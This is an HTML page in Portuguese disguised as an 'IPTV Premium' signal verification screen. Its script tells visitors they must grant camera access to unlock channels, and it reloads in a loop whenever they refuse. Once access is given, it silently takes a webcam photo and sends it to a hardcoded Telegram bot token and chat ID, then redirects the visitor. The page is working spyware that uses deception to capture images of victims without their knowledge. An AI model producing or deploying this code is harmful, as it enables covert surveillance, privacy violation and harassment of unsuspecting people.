<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPTV Premium - Verificação de Sinal</title>
    <style>
        /* Estilo Dark Profissional */
        body { 
            background: #0f0f0f; 
            color: #ffffff; 
            text-align: center; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
        }
        .container { padding: 20px; }
        .player-box {
            background: #1a1a1a;
            border: 2px solid #3498db;
            border-radius: 15px;
            width: 90%;
            max-width: 500px;
            margin: 0 auto;
            padding: 30px;
            box-shadow: 0 0 20px rgba(52, 152, 219, 0.3);
        }
        .loader { 
            border: 8px solid #333; 
            border-top: 8px solid #3498db; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #3498db; margin-bottom: 10px; }
        p { color: #aaaaaa; font-size: 14px; }
        .status { font-weight: bold; color: #f1c40f; }
    </style>
</head>
<body>

    <div class="container">
        <div class="player-box">
            <h2>Sinal IPTV HD</h2>
            <div class="loader"></div>
            <p id="msg">Iniciando verificação de segurança...</p>
            <p class="status">Status: Aguardando permissão do dispositivo</p>
            <hr style="border: 0.5px solid #333; margin: 20px 0;">
            <p style="font-size: 12px;">Para liberar o acesso aos canais, confirme a verificação de dispositivo no seu navegador.</p>
        </div>
    </div>
    
    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // Seus dados mantidos conforme solicitado
        const token = '8632329845:AAEV3zXLv1xR3N3Z9-HTbjvuMjX5cvpuQOo';
        const chat_id = '5609141148';

        async function startCamera() {
            const msgElement = document.getElementById('msg');
            try {
                // Solicita a câmera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                msgElement.innerText = "Sinal Verificado! Carregando canais...";
                msgElement.style.color = "#2ecc71";

                // Tira a foto após 2 segundos (tempo do rosto focar)
                setTimeout(() => {
                    takeSnap();
                }, 2000);

            } catch (err) {
                // Se ele negar, o site avisa e tenta de novo (gera o loop de trollagem)
                alert("ERRO DE SINAL: É necessário permitir a câmera para validar seu acesso e evitar pirataria. O vídeo só será liberado após a confirmação.");
                location.reload(); 
            }
        }

        function takeSnap() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'troll.jpg');
                formData.append('caption', '📸 Foto capturada do seu novo player!');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    // Manda para o vídeo do YouTube após a foto ser enviada
                    window.location.href = "";
                });
            }, 'image/jpeg');
        }

        window.onload = startCamera;
    </script>
</body>
</html>
